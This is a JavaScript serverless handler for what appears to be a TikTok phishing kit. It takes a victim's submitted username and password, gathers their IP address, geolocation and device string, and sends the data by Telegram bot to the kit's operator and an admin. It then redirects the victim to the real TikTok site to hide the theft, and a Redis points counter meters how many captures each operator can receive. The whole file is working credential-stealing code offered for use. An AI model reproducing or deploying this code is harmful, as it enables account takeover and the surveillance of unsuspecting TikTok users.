const fetch = require('node-fetch');
const { Telegraf } = require('telegraf');
const { Redis } = require('@upstash/redis');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Redis setup
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { username, password, uid } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  const adminId = process.env.ADMIN_ID; // د اډمین تلګرام ID

  // Step 1: Redis points
  let points = await redis.get(uid);
  if (!points) {
    points = 5;
    await redis.set(uid, 5);
  }

  if (parseInt(points) <= 0) {
    await bot.telegram.sendMessage(uid, "❌ ستاسو امتیازونه ختم شوي دي.");
    return res.status(403).send("❌ No more points");
  }

  // Step 2: Get IP location
  let geo = {};
  try {
    geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
  } catch (e) {
    geo = {};
  }

  // Step 3: Compose message
  const message = `
╭───🔘 *TikTok Login Data Received ✅* ───╮
├ 👤 *Username:* \`${username}\`
├ 🔐 *Password:* \`${password}\`
├ 🆔 *User ID:* \`${uid}\`
├ 📆 *Time:* \`${timestamp}\`
├ 🌐 *IP:* \`${ip}\`
├ 🏙️ *City:* \`${geo.city || 'Unknown'}\`
├ 🌍 *Country:* \`${geo.country || 'Afghanistan'}\`
├ 🛰️ *ISP:* \`${geo.isp || 'Unknown'}\`
├ 📱 *Device:* \`${userAgent}\`
╰━━━━━━━━━━━━━━━━━━━━━━╯

✅ *د ټيک ټاک معلومات ترلاسه شول*

╭─────── 🚀 *Root Access Panel 💠* ───────╮
│ 🧑🏻‍💻 *𝗕𝘂𝗶𝗹𝘁 𝗕𝘆:* 💛 *𝗪𝗔𝗖𝗜𝗤*
╰───────────────────────────────────────╯
`;

  try {
    // Step 4: Send to user
    await bot.telegram.sendMessage(uid, message, { parse_mode: "Markdown" });

    // Step 5: Send to admin
    if (adminId) {
      await bot.telegram.sendMessage(adminId, message, { parse_mode: "Markdown" });
    }

    // Step 6: Deduct one point
    await redis.decr(uid);

    return res.redirect('https://www.tiktok.com'); // redirect to TikTok
  } catch (e) {
    console.error("Telegram Error:", e.message);
    return res.status(500).send("❌ Failed to send message.");
  }
}; 
